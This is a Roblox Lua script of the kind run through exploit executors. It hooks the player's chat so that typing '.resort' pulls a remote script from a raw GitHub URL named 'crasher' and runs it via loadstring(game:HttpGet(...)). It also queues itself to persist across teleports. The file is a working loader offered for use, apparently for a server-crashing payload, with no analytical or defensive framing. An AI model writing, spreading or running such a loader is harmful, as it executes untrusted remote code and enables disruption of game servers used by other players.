local logic_script = [=[
    local Players = game:GetService("Players")
    local StarterGui = game:GetService("StarterGui")
    local LocalPlayer = Players.LocalPlayer
    local TargetScript = "https://raw.githubusercontent.com/codexvsberserkerxylo/scripts/refs/heads/main/crasher"
    local hasActivated = false
    LocalPlayer.Chatted:Connect(function(msg)
        if msg:lower() == ".resort" then
            pcall(function()
                StarterGui:SetCore("SendNotification", {
                    Title = "resort";
                    Text = "resort loaded";
                    Duration = 3;
                })
            end)
            loadstring(game:HttpGet(TargetScript))()
        end
    end)
]=]
loadstring(logic_script)()
if queue_on_teleport then
    queue_on_teleport("loadstring([=[" .. logic_script .. "]=])()")
elseif syn and syn.queue_on_teleport then
    syn.queue_on_teleport("loadstring([=[" .. logic_script .. "]=])()")
end
